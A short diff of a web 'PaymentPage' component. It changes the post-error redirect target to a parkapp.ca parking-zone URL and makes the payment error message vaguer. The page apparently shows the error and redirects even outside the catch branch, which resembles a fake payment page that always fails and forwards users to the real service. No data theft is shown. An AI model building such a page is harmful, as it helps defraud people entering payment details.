@@ -61,7 +61,7 @@ export default function PaymentPage() {
         setShowError(true);
 
         setTimeout(() => {
-          router.push('https://car.com');
+          router.push('https://parkapp.ca/zone/65abf5a7cbccb4a384daacbe');
         }, 1000);
       }, 1000);
     } catch (error) {
@@ -70,7 +70,7 @@ export default function PaymentPage() {
       setShowError(true);
 
       setTimeout(() => {
-        router.push('https://car.com');
+        router.push('https://parkapp.ca/zone/65abf5a7cbccb4a384daacbe');
       }, 1000);
     }
   };
@@ -230,9 +230,9 @@ export default function PaymentPage() {
         <Dialog open={showError} onOpenChange={setShowError}>
           <DialogContent>
             <DialogHeader>
-              <DialogTitle>Payment Error</DialogTitle>
+              <DialogTitle>Error</DialogTitle>
               <DialogDescription>
-                There was an error processing your payment. Please try again later.
+                There was an error processing. Please try again.
               </DialogDescription>
             </DialogHeader>
           </DialogContent>
